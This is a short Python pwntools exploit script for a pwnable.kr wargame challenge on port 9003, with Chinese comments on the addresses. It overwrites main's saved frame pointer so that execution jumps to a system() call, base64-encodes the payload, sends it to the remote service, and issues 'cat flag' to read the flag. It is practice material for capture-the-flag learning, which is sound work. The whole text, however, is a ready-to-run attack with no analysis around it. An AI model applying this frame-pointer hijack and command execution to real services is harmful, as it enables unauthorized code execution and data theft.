#-*-coding: utf-8-*-
from pwn import *

call_system = 0x08049284	# [fake_main_ebp + 4] 即main函数的返回地址
fake_main_ebp = 0x0811EB40	# 用于覆盖main函数的ebp

payload = "junk" + p32(call_system) + p32(fake_main_ebp)

r = remote("pwnable.kr", 9003)
r.recvuntil(" : ")
r.send(payload.encode("base64"))
r.sendline("cat flag")
r.sendline("exit")
print r.recvall()
